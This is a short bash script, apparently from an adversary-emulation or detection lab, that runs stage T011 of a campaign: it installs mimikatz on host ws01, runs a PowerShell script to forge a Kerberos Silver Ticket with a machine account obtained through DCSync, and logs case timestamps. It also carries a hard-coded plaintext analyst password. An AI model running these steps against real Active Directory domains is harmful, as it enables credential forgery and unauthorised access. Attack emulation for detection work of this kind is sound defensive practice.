#!/usr/bin/env bash
# T011 — Silver ticket from ws01 (MBR01$ machine account via DCSync child)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T011-SILVER-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T011 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t011-silver.ps1)"
printf '%s\n' "${OUT}"
campaign_require_ok T011 "${OUT}" 'T011_OK'

cadre_export "${CASE_ID}" T011 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
